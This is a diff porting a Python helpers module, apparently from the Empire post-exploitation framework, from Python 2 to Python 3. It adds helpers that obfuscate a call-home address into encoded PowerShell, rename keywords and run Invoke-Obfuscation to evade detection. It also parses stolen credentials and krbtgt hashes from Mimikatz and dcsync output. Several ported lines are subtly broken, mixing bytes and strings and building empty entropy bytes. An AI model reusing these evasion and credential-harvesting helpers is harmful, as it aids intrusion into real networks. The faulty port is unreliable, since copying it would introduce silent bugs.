@@ -36,9 +36,17 @@ Includes:
     dict_factory() - helper that returns the SQLite query results as a dictionary
     KThread() - a subclass of threading.Thread, with a kill() method
     slackMessage() - send notifications to the Slack API
-
+    generate_random_script_var_name() - use in scripts to generate random variable names
 """
+from __future__ import division
+from __future__ import print_function
 
+from future import standard_library
+
+standard_library.install_aliases()
+from builtins import str
+from builtins import range
+from past.utils import old_div
 import re
 import string
 import base64
@@ -55,12 +63,11 @@ import random
 
 import subprocess
 import fnmatch
-import urllib, urllib2
+import urllib.request, urllib.parse, urllib.error, urllib.request, urllib.error, urllib.parse
 import hashlib
 import datetime
-import uuid
-import ipaddress
-from datetime import datetime
+
+from datetime import datetime, timezone
 
 ###############################################################
 #
@@ -68,8 +75,10 @@ from datetime import datetime
 #
 ################################################################
 
-globentropy=random.randint(1,datetime.today().day)
-globDebug=False
+globentropy = random.randint(1, datetime.today().day)
+globDebug = False
+
+
 ###############################################################
 #
 # Validation methods
@@ -90,7 +99,6 @@ def validate_ip(IP):
             return validate_IPv6
     except Exception as e:
         return e
-
 
 
 def validate_ntlm(data):
@@ -123,15 +131,15 @@ def generate_ip_list(s):
             p = part.split("-")
             if len(p) == 2:
                 if iptools.ipv4.validate_ip(p[0]) and iptools.ipv4.validate_ip(p[1]):
-                    ranges += "('"+str(p[0])+"', '"+str(p[1])+"'),"
+                    ranges += "('" + str(p[0]) + "', '" + str(p[1]) + "'),"
             else:
                 if "/" in part and iptools.ipv4.validate_cidr(part):
-                    ranges += "'"+str(p[0])+"',"
+                    ranges += "'" + str(p[0]) + "',"
                 elif iptools.ipv4.validate_ip(part):
-                    ranges += "'"+str(p[0])+"',"
+                    ranges += "'" + str(p[0]) + "',"
 
         if ranges != "":
-            return eval("iptools.IpRangeList("+ranges+")")
+            return eval("iptools.IpRangeList(" + ranges + ")")
         else:
             return None
 
@@ -144,40 +152,50 @@ def generate_ip_list(s):
 # Randomizers/obfuscators
 #
 ####################################################################################
-
 def random_string(length=-1, charset=string.ascii_letters):
     """
     Returns a random string of "length" characters.
     If no length is specified, resulting string is in between 6 and 15 characters.
     A character set can be specified, defaulting to just alpha letters.
     """
-    if length == -1: length = random.randrange(6,16)
+    if length == -1: length = random.randrange(6, 16)
     random_string = ''.join(random.choice(charset) for x in range(length))
     return random_string
 
 
-def generate_random_script_var_name(origvariname,globDebug=False):
+def generate_random_script_var_name(origvariname, globDebug=False):
     if globDebug:
-	    return origvariname
+        return origvariname
     else:
-	    hash_object=hashlib.sha1(str(origvariname)+str(globentropy)).hexdigest()
-    return hash_object[:-datetime.today().day]
+        origvariname = origvariname.encode('UTF-8')
+        entrop = bytes(globentropy)
+        hash_object = hashlib.sha1(origvariname + entrop).hexdigest()
+        return hash_object[:(3 + (globentropy % 3))]
+
 
 def randomize_capitalization(data):
     """
     Randomize the capitalization of a string.
     """
-    return "".join( random.choice([k.upper(), k ]) for k in data )
+    return "".join(random.choice([k.upper(), k]) for k in data)
 
+
+def obfuscate_call_home_address(data):
+    """
+    Poowershell script to base64 encode variable contents and execute on command as if clear text in powershell
+    """
+    tmp = '$(' + randomize_capitalization(
+        '[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\'')
+    tmp += (enc_powershell(data)).decode('UTF-8') + '\')))'
+    return tmp
 
 def chunks(l, n):
     """
     Generator to split a string l into chunks of size n.
-
     Used by macro modules.
     """
-    for i in xrange(0, len(l), n):
-        yield l[i:i+n]
+    for i in range(0, len(l), n):
+        yield l[i:i + n]
 
 
 ####################################################################################
@@ -193,7 +211,7 @@ def strip_python_comments(data):
     Strip block comments, line comments, empty lines, verbose statements,
     and debug statements from a Python source file.
     """
-    print color("[!] strip_python_comments is deprecated and should not be used")
+    print(color("[!] strip_python_comments is deprecated and should not be used"))
     lines = data.split("\n")
     strippedLines = [line for line in lines if ((not line.strip().startswith("#")) and (line.strip() != ''))]
     return "\n".join(strippedLines)
@@ -209,7 +227,11 @@ def enc_powershell(raw):
     """
     Encode a PowerShell command into a form usable by powershell.exe -enc ...
     """
-    return base64.b64encode("".join([char + "\x00" for char in unicode(raw)]))
+    tmp = base64.b64encode(raw.encode('UTF-16LE'))
+    #tmp = raw
+    #tmp = bytes("".join([str(char) + "\x00" for char in raw]), "UTF-16LE")
+    #tmp = base64.b64encode(tmp)
+    return tmp
 
 
 def powershell_launcher(raw, modifiable_launcher):
@@ -219,7 +241,7 @@ def powershell_launcher(raw, modifiable_launcher):
     # encode the data into a form usable by -enc
     encCMD = enc_powershell(raw)
 
-    return modifiable_launcher + " " + encCMD
+    return modifiable_launcher + " " + encCMD.decode('UTF-8')
 
 
 def parse_powershell_script(data):
@@ -240,10 +262,26 @@ def strip_powershell_comments(data):
     strippedCode = re.sub(re.compile('<#.*?#>', re.DOTALL), '\n', data)
 
     # strip blank lines, lines starting with #, and verbose/debug statements
-    strippedCode = "\n".join([line for line in strippedCode.split('\n') if ((line.strip() != '') and (not line.strip().startswith("#")) and (not line.strip().lower().startswith("write-verbose ")) and (not line.strip().lower().startswith("write-debug ")) )])
+    strippedCode = "\n".join([line for line in strippedCode.split('\n') if (
+                (line.strip() != '') and (not line.strip().startswith("#")) and (
+            not line.strip().lower().startswith("write-verbose ")) and (
+                    not line.strip().lower().startswith("write-debug ")))])
 
     return strippedCode
 
+
+def keyword_obfuscation(data):
+    conn = sqlite3.connect('./data/empire.db', check_same_thread=False)
+    conn.isolation_level = None
+    conn.row_factory = None
+    cur = conn.cursor()
+    cur.execute("SELECT * FROM functions")
+    for replacement in cur.fetchall():
+        data = data.replace(replacement[0], replacement[1])
+    cur.close()
+    conn.close()
+
+    return data
 
 ####################################################################################
 #
@@ -265,7 +303,7 @@ def get_powerview_psreflect_overhead(script):
     try:
         return strip_powershell_comments(pattern.findall(script)[0])
     except:
-        print color("[!] Error extracting psreflect overhead from script!")
+        print(color("[!] Error extracting psreflect overhead from script!"))
         return ""
 
 
@@ -278,7 +316,7 @@ def get_dependent_functions(code, functionNames):
     dependentFunctions = set()
     for functionName in functionNames:
         # find all function names that aren't followed by another alpha character
-        if re.search("[^A-Za-z']+"+functionName+"[^A-Za-z']+", code, re.IGNORECASE):
+        if re.search("[^A-Za-z']+" + functionName + "[^A-Za-z']+", code, re.IGNORECASE):
             # if "'AbuseFunction' \"%s" % (functionName) not in code:
             # TODO: fix superflous functions from being added to PowerUp Invoke-AllChecks code...
             dependentFunctions.add(functionName)
@@ -311,10 +349,10 @@ def find_all_dependent_functions(functions, functionsToProcess, resultFunctions=
 
         # get the dependencies for the function we're currently processing
         try:
-            functionDependencies = get_dependent_functions(functions[requiredFunction], functions.keys())
+            functionDependencies = get_dependent_functions(functions[requiredFunction], list(functions.keys()))
         except:
             functionDependencies = []
-            print color("[!] Error in retrieving dependencies for function %s !" %(requiredFunction))
+            print(color("[!] Error in retrieving dependencies for function %s !" % (requiredFunction)))
 
         for functionDependency in functionDependencies:
             if functionDependency not in resultFunctions and functionDependency not in functionsToProcess:
@@ -367,7 +405,7 @@ def generate_dynamic_powershell_script(script, functionNames):
         try:
             newScript += functions[functionDependency] + "\n"
         except:
-            print color("[!] Key error with function %s !" %(functionDependency))
+            print(color("[!] Key error with function %s !" % (functionDependency)))
 
     # if any psreflect methods are needed, add in the overhead at the end
     if any(el in set(psreflect_functions) for el in functionDependencies):
@@ -386,21 +424,22 @@ def parse_credentials(data):
     """
     Enumerate module output, looking for any parseable credential sections.
     """
-
-    parts = data.split("\n")
+    if isinstance(data, str):
+        data = data.encode('UTF-8')
+    parts = data.split(b"\n")
 
     # tag for Invoke-Mimikatz output
-    if parts[0].startswith("Hostname:"):
+    if parts[0].startswith(b"Hostname:"):
         return parse_mimikatz(data)
 
     # powershell/collection/prompt output
-    elif parts[0].startswith("[+] Prompted credentials:"):
+    elif parts[0].startswith(b"[+] Prompted credentials:"):
 
-        parts = parts[0].split("->")
+        parts = parts[0].split(b"->")
         if len(parts) == 2:
 
-            username = parts[1].split(":",1)[0].strip()
-            password = parts[1].split(":",1)[1].strip()
+            username = parts[1].split(b":", 1)[0].strip()
+            password = parts[1].split(b":", 1)[1].strip()
 
             if "\\" in username:
                 domain = username.split("\\")[0].strip()
@@ -411,11 +450,11 @@ def parse_credentials(data):
             return [("plaintext", domain, username, password, "", "")]
 
         else:
-            print color("[!] Error in parsing prompted credential output.")
+            print(color("[!] Error in parsing prompted credential output."))
             return None
 
     # python/collection/prompt (Mac OS)
-    elif "text returned:" in parts[0]:
+    elif b"text returned:" in parts[0]:
         parts2 = parts[0].split("text returned:")
         if len(parts2) >= 2:
             password = parts2[-1]
@@ -435,30 +474,33 @@ def parse_mimikatz(data):
     creds = []
 
     # regexes for "sekurlsa::logonpasswords" Mimikatz output
-    regexes = ["(?s)(?<=msv :).*?(?=tspkg :)", "(?s)(?<=tspkg :).*?(?=wdigest :)", "(?s)(?<=wdigest :).*?(?=kerberos :)", "(?s)(?<=kerberos :).*?(?=ssp :)", "(?s)(?<=ssp :).*?(?=credman :)", "(?s)(?<=credman :).*?(?=Authentication Id :)", "(?s)(?<=credman :).*?(?=mimikatz)"]
+    regexes = ["(?s)(?<=msv :).*?(?=tspkg :)", "(?s)(?<=tspkg :).*?(?=wdigest :)",
+               "(?s)(?<=wdigest :).*?(?=kerberos :)", "(?s)(?<=kerberos :).*?(?=ssp :)",
+               "(?s)(?<=ssp :).*?(?=credman :)", "(?s)(?<=credman :).*?(?=Authentication Id :)",
+               "(?s)(?<=credman :).*?(?=mimikatz)"]
 
     hostDomain = ""
     domainSid = ""
     hostName = ""
-
-    lines = data.split("\n")
+    if isinstance(data, str):
+        data = data.encode("UTF-8")
+    lines = data.split(b"\n")
     for line in lines[0:2]:
-        if line.startswith("Hostname:"):
+        if line.startswith(b"Hostname:"):
             try:
-                domain = line.split(":")[1].strip()
-                temp = domain.split("/")[0].strip()
-                domainSid = domain.split("/")[1].strip()
+                domain = line.split(b":")[1].strip()
+                temp = domain.split(b"/")[0].strip()
+                domainSid = domain.split(b"/")[1].strip()
 
-                hostName = temp.split(".")[0]
-                hostDomain = ".".join(temp.split(".")[1:])
+                hostName = temp.split(b".")[0]
+                hostDomain = b".".join(temp.split(".")[1:])
             except:
                 pass
 
     for regex in regexes:
 
         p = re.compile(regex)
-
-        for match in p.findall(data):
+        for match in p.findall(data.decode("UTF-8")):
 
             lines2 = match.split("\n")
             username, domain, password = "", "", ""
@@ -466,11 +508,11 @@ def parse_mimikatz(data):
             for line in lines2:
                 try:
                     if "Username" in line:
-                        username = line.split(":",1)[1].strip()
+                        username = line.split(":", 1)[1].strip()
                     elif "Domain" in line:
-                        domain = line.split(":",1)[1].strip()
+                        domain = line.split(":", 1)[1].strip()
                     elif "NTLM" in line or "Password" in line:
-                        password = line.split(":",1)[1].strip()
+                        password = line.split(":", 1)[1].strip()
                 except:
                     pass
 
@@ -496,8 +538,8 @@ def parse_mimikatz(data):
     if len(creds) == 0:
         # check if we have lsadump output to check for krbtgt
         #   happens on domain controller hashdumps
-        for x in xrange(8,13):
-            if lines[x].startswith("Domain :"):
+        for x in range(8, 13):
+            if lines[x].startswith(b"Domain :"):
 
                 domain, sid, krbtgtHash = "", "", ""
 
@@ -511,9 +553,9 @@ def parse_mimikatz(data):
                         domain = hostDomain
                         sid = domainSid
 
-                    for x in xrange(0, len(lines)):
+                    for x in range(0, len(lines)):
                         if lines[x].startswith("User : krbtgt"):
-                            krbtgtHash = lines[x+2].split(":")[1].strip()
+                            krbtgtHash = lines[x + 2].split(":")[1].strip()
                             break
 
                     if krbtgtHash != "":
@@ -523,7 +565,7 @@ def parse_mimikatz(data):
 
     if len(creds) == 0:
         # check if we get lsadump::dcsync output
-        if '** SAM ACCOUNT **' in lines:
+        if b'** SAM ACCOUNT **' in lines:
             domain, user, userHash, dcName, sid = "", "", "", "", ""
             for line in lines:
                 try:
@@ -591,7 +633,7 @@ def get_listener_options(listenerName):
         conn.isolation_level = None
         conn.row_factory = dict_factory
         cur = conn.cursor()
-        cur.execute("SELECT options FROM listeners WHERE name = ?", [listenerName] )
+        cur.execute("SELECT options FROM listeners WHERE name = ?", [listenerName])
         result = cur.fetchone()
         cur.close()
         conn.close()
@@ -602,10 +644,12 @@ def get_listener_options(listenerName):
 
 def get_datetime():
     """
-    Return the current date/time
+    Return the local current date/time
     """
     return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
+def getutcnow():
+    return datetime.now(timezone.utc)
 
 def utc_to_local(utc):
     """
@@ -614,6 +658,7 @@ def utc_to_local(utc):
 
     offset = datetime.now() - datetime.utcnow()
     return (utc + offset).strftime("%Y-%m-%d %H:%M:%S")
+
 
 def get_file_datetime():
     """
@@ -627,17 +672,17 @@ def get_file_size(file):
     Returns a string with the file size and highest rating.
     """
     byte_size = sys.getsizeof(file)
-    kb_size = byte_size / 1024
+    kb_size = old_div(byte_size, 1024)
     if kb_size == 0:
         byte_size = "%s Bytes" % (byte_size)
         return byte_size
-    mb_size = kb_size / 1024
+    mb_size = old_div(kb_size, 1024)
     if mb_size == 0:
         kb_size = "%s KB" % (kb_size)
         return kb_size
-    gb_size = mb_size / 1024 % (mb_size)
+    gb_size = old_div(mb_size, 1024) % (mb_size)
     if gb_size == 0:
-        mb_size = "%s MB" %(mb_size)
+        mb_size = "%s MB" % (mb_size)
         return mb_size
     return "%s GB" % (gb_size)
 
@@ -647,18 +692,18 @@ def lhost():
     Return the local IP.
     """
 
-
     if os.name != 'nt':
         import fcntl
         import struct
+
         def get_interface_ip(ifname):
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 return socket.inet_ntoa(fcntl.ioctl(
-                        s.fileno(),
-                        0x8915,  # SIOCGIFADDR
-                        struct.pack('256s', str(ifname[:15]))
-                    )[20:24])
+                    s.fileno(),
+                    0x8915,  # SIOCGIFADDR
+                    struct.pack('256s', ifname[:15].encode("UTF-8"))
+                )[20:24])
             except IOError as e:
                 return ""
 
@@ -668,7 +713,7 @@ def lhost():
     except socket.gaierror:
         pass
     except:
-        print "Unexpected error:", sys.exc_info()[0]
+        print("Unexpected error:", sys.exc_info()[0])
         return ip
 
     if (ip == '' or ip.startswith('127.')) and os.name != 'nt':
@@ -680,7 +725,7 @@ def lhost():
                     if ip != "":
                         break
                 except:
-                    print 'Unexpected error:', sys.exc_info()[0]
+                    print('Unexpected error:', sys.exc_info()[0])
                     pass
     return ip
 
@@ -718,20 +763,43 @@ def color(string, color=None):
         else:
             return string
 
+
+def is_stale(lastseen : datetime, delay: int, jitter: float):
+    """Convenience function for calculating staleness"""
+    interval_max = (delay + delay * jitter) + 30
+    diff = getutcnow() - lastseen
+    stale = diff.total_seconds() > interval_max
+    return stale
+
+
 def lastseen(stamp, delay, jitter):
     """
     Colorize the Last Seen field based on measured delays
     """
     try:
-        delta = datetime.now() - datetime.strptime(stamp, "%Y-%m-%d %H:%M:%S")
-        if delta.seconds > delay * (jitter + 1) * 5:
-            return color(stamp, "red")
-        elif delta.seconds > delay * (jitter + 1):
-            return color(stamp, "yellow")
+        if "T" in stamp:
+            stamp_date = datetime.strptime(stamp, "%Y-%m-%dT%H:%M:%S.%f%z").astimezone(tz=None) # Display local
         else:
-            return color(stamp, "green")
+            stamp_date = datetime.strptime(stamp, "%Y-%m-%d %H:%M:%S.%f%z").astimezone(tz=None) # Display local
+            
+        stamp_display_local = stamp_date.strftime('%Y-%m-%d %H:%M:%S')
+        delta = getutcnow() - stamp_date
+
+        # Set min threshold for delay/jitter
+        if delay < 1:
+            delay = 1
+        if jitter < 1:
+            jitter = 1
+
+        if delta.total_seconds() > delay * (jitter + 1) * 7:
+            return color(stamp_display_local, "red")
+        elif delta.total_seconds() > delay * (jitter + 1) * 3:
+            return color(stamp_display_local, "yellow")
+        else:
+            return color(stamp_display_local, "green")
     except Exception:
-        return stamp
+        return stamp[:19].replace("T", " ")
+
 
 def unique(seq, idfun=None):
     """
@@ -761,7 +829,8 @@ def uniquify_tuples(tuples):
     cred format- (credType, domain, username, password, hostname, sid)
     """
     seen = set()
-    return [item for item in tuples if "%s%s%s%s"%(item[0],item[1],item[2],item[3]) not in seen and not seen.add("%s%s%s%s"%(item[0],item[1],item[2],item[3]))]
+    return [item for item in tuples if "%s%s%s%s" % (item[0], item[1], item[2], item[3]) not in seen and not seen.add(
+        "%s%s%s%s" % (item[0], item[1], item[2], item[3]))]
 
 
 def decode_base64(data):
@@ -770,8 +839,11 @@ def decode_base64(data):
     From http://stackoverflow.com/questions/2941995/python-ignore-incorrect-padding-error-when-base64-decoding
     """
     missing_padding = 4 - len(data) % 4
+    if isinstance(data, str):
+        data = data.encode('UTF-8')
+
     if missing_padding:
-        data += b'='* missing_padding
+        data += b'=' * missing_padding
 
     try:
         result = base64.decodestring(data)
@@ -783,9 +855,9 @@ def decode_base64(data):
 
 def encode_base64(data):
     """
-    Decode data as a base64 string.
+    Encode data as a base64 string.
     """
-    return base64.encodestring(data).strip()
+    return base64.encodebytes(data).strip()
 
 
 def complete_path(text, line, arg=False):
@@ -815,10 +887,10 @@ def complete_path(text, line, arg=False):
         completions = []
         for f in os.listdir(dir):
             if f.startswith(base):
-                if os.path.isfile(os.path.join(dir,f)):
+                if os.path.isfile(os.path.join(dir, f)):
                     completions.append(f)
                 else:
-                    completions.append(f+'/')
+                    completions.append(f + '/')
 
     return completions
 
@@ -834,6 +906,7 @@ def dict_factory(cursor, row):
         d[col[0]] = row[idx]
     return d
 
+
 def get_module_source_files():
     """
     Get the filepaths of PowerShell module_source files located
@@ -843,15 +916,16 @@ def get_module_source_files():
     pattern = '*.ps1'
     for root, dirs, files in os.walk('data/module_source'):
         for filename in fnmatch.filter(files, pattern):
-                paths.append(os.path.join(root, filename))
+            paths.append(os.path.join(root, filename))
     return paths
+
 
 def obfuscate(installPath, psScript, obfuscationCommand):
     """
     Obfuscate PowerShell scripts using Invoke-Obfuscation
     """
     if not is_powershell_installed():
-        print color("[!] PowerShell is not installed and is required to use obfuscation, please install it first.")
+        print(color("[!] PowerShell is not installed and is required to use obfuscation, please install it first."))
         return ""
     # When obfuscating large scripts, command line length is too long. Need to save to temp file
     toObfuscateFilename = installPath + "data/misc/ToObfuscate.ps1"
@@ -860,13 +934,17 @@ def obfuscate(installPath, psScript, obfuscationCommand):
     toObfuscateFile.write(psScript)
     toObfuscateFile.close()
     # Obfuscate using Invoke-Obfuscation w/ PowerShell
-    subprocess.call("%s -C '$ErrorActionPreference = \"SilentlyContinue\";Invoke-Obfuscation -ScriptPath %s -Command \"%s\" -Quiet | Out-File -Encoding ASCII %s'" % (get_powershell_name(), toObfuscateFilename, convert_obfuscation_command(obfuscationCommand), obfuscatedFilename), shell=True)
-    obfuscatedFile = open(obfuscatedFilename , 'r')
+    subprocess.call(
+        "%s -C '$ErrorActionPreference = \"SilentlyContinue\";Invoke-Obfuscation -ScriptPath %s -Command \"%s\" -Quiet | Out-File -Encoding ASCII %s'" % (
+        get_powershell_name(), toObfuscateFilename, convert_obfuscation_command(obfuscationCommand),
+        obfuscatedFilename), shell=True)
+    obfuscatedFile = open(obfuscatedFilename, 'r')
     # Obfuscation writes a newline character to the end of the file, ignoring that character
     psScript = obfuscatedFile.read()[0:-1]
     obfuscatedFile.close()
 
     return psScript
+
 
 def obfuscate_module(moduleSource, obfuscationCommand="", forceReobfuscation=False):
     if is_obfuscated(moduleSource) and not forceReobfuscation:
@@ -875,11 +953,16 @@ def obfuscate_module(moduleSource, obfuscationCommand="", forceReobfuscation=Fal
     try:
         f = open(moduleSource, 'r')
     except:
-        print color("[!] Could not read module source path at: " + moduleSource)
+        print(color("[!] Could not read module source path at: " + moduleSource))
         return ""
 
     moduleCode = f.read()
     f.close()
+
+    # Get the random function name generated at install and patch the stager with the proper function name
+
+    moduleCode = keyword_obfuscation(moduleCode)
+
 
     # obfuscate and write to obfuscated source path
     path = os.path.abspath('empire.py').split('empire.py')[0] + "/"
@@ -888,17 +971,20 @@ def obfuscate_module(moduleSource, obfuscationCommand="", forceReobfuscation=Fal
     try:
         f = open(obfuscatedSource, 'w')
     except:
-        print color("[!] Could not read obfuscated module source path at: " + obfuscatedSource)
+        print(color("[!] Could not read obfuscated module source path at: " + obfuscatedSource))
         return ""
     f.write(obfuscatedCode)
     f.close()
+
 
 def is_obfuscated(moduleSource):
     obfuscatedSource = moduleSource.replace("module_source", "obfuscated_module_source")
     return os.path.isfile(obfuscatedSource)
 
+
 def is_powershell_installed():
     return (get_powershell_name() != "")
+
 
 def get_powershell_name():
     try:
@@ -911,8 +997,10 @@ def get_powershell_name():
         return "pwsh"
     return "powershell"
 
+
 def convert_obfuscation_command(obfuscate_command):
-    return "".join(obfuscate_command.split()).replace(",",",home,").replace("\\",",")
+    return "".join(obfuscate_command.split()).replace(",", ",home,").replace("\\", ",")
+
 
 class KThread(threading.Thread):
     """
@@ -927,7 +1015,7 @@ class KThread(threading.Thread):
     def start(self):
         """Start the thread."""
         self.__run_backup = self.run
-        self.run = self.__run      # Force the Thread toinstall our trace.
+        self.run = self.__run  # Force the Thread toinstall our trace.
         threading.Thread.start(self)
 
     def __run(self):
@@ -951,8 +1039,9 @@ class KThread(threading.Thread):
     def kill(self):
         self.killed = True
 
+
 def slackMessage(slackToken, slackChannel, slackText):
-	url = "https://slack.com/api/chat.postMessage"
-	data = urllib.urlencode({'token': slackToken, 'channel':slackChannel, 'text':slackText})
- 	req = urllib2.Request(url, data)
- 	resp = urllib2.urlopen(req)
+    url = "https://slack.com/api/chat.postMessage"
+    data = urllib.parse.urlencode({'token': slackToken, 'channel': slackChannel, 'text': slackText})
+    req = urllib.request.Request(url, data.encode('UTF-8'))
+    resp = urllib.request.urlopen(req)
